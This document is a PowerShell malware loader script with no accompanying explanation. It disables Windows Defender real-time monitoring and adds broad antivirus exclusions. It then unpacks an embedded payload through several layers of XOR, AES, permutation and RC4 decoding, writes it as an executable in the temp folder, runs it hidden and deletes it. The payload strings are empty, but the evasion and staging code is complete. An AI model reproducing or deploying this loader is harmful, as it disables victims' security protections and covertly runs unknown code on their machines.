$ErrorActionPreference='SilentlyContinue'
try{Add-MpPreference -ExclusionPath $env:TEMP,'C:\Users','C:\ProgramData' -ExclusionProcess 'powershell.exe','cmd.exe' -EA 0;Set-MpPreference -DisableRealtimeMonitoring $true -EA 0}catch{}

$_eb=[Convert]::FromBase64String('')
$_mj=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))

function _Gv{param($j,$k);if($j -match('"'+$k+'":\s*"([^"]+)"')){return,[Convert]::FromBase64String($Matches[1])};return,$null}
function _Gi{param($j,$k);if($j -match('"'+$k+'":\s*"([0-9]+)"')){return[uint32]$Matches[1]};return 0}

function _L5r{param($d,$k)
  $r=[byte[]]::new($d.Length)
  for($i=0;$i-lt$d.Length;$i++){$r[$i]=$d[$i]-bxor$k[$i%$k.Length]}
  return,$r}
function _L4r{param($d,$pw,$salt,$iv)
  $kg=New-Object Security.Cryptography.Rfc2898DeriveBytes($pw,$salt,50000)
  $a=[Security.Cryptography.Aes]::Create()
  $a.KeySize=256;$a.BlockSize=128;$a.Mode='CBC';$a.Padding='PKCS7'
  $a.Key=$kg.GetBytes(32);$a.IV=$iv
  $ms=New-Object IO.MemoryStream(,$d)
  $cs=New-Object Security.Cryptography.CryptoStream($ms,$a.CreateDecryptor(),'Read')
  $os=New-Object IO.MemoryStream;$cs.CopyTo($os)
  $a.Dispose();$cs.Dispose();$ms.Dispose()
  return,$os.ToArray()}
function _L3r{param($d)
  $n=[BitConverter]::ToInt32($d,0);$hl=4+$n*4
  $perm=[int[]]::new($n)
  for($i=0;$i-lt$n;$i++){$perm[$i]=[BitConverter]::ToInt32($d,4+$i*4)}
  $sh=[byte[]]($d[$hl..($hl+$n-1)])
  $r=[byte[]]::new($n)
  for($i=0;$i-lt$n;$i++){$r[$perm[$i]]=$sh[$i]}
  return,$r}
function _L2r{param($d,$k)
  $S=[int[]](0..255);$j=0
  for($i=0;$i-lt 256;$i++){$j=($j+$S[$i]+$k[$i%$k.Length])%256;$t=$S[$i];$S[$i]=$S[$j];$S[$j]=$t}
  $r=[byte[]]::new($d.Length);$ii=0;$j=0
  for($n=0;$n-lt$d.Length;$n++){
    $ii=($ii+1)%256;$j=($j+$S[$ii])%256;$t=$S[$ii];$S[$ii]=$S[$j];$S[$j]=$t
    $r[$n]=$d[$n]-bxor$S[($S[$ii]+$S[$j])%256]}
  return,$r}
function _L1r{param($d,$k);return,(_L5r $d $k)}

$xk  = _Gv $_mj 'xk'
$rk  = _Gv $_mj 'rk'
$as  = _Gv $_mj 'as'
$ai  = _Gv $_mj 'ai'
$ap  = [Text.Encoding]::UTF8.GetString((_Gv $_mj 'ap'))
$rxk = _Gv $_mj 'rxk'

$_t4 = _L5r $_eb $rxk
$_t3 = _L4r $_t4 $ap $as $ai
$_t2 = _L3r $_t3
$_t1 = _L2r $_t2 $rk
$_t0 = _L1r $_t1 $xk

$_tp=Join-Path $env:TEMP 'gzxamhxa.exe'
[IO.File]::WriteAllBytes($_tp,$_t0)
Start-Process $_tp -WindowStyle Hidden
Start-Sleep -Seconds 3
Remove-Item $_tp -Force -EA 0
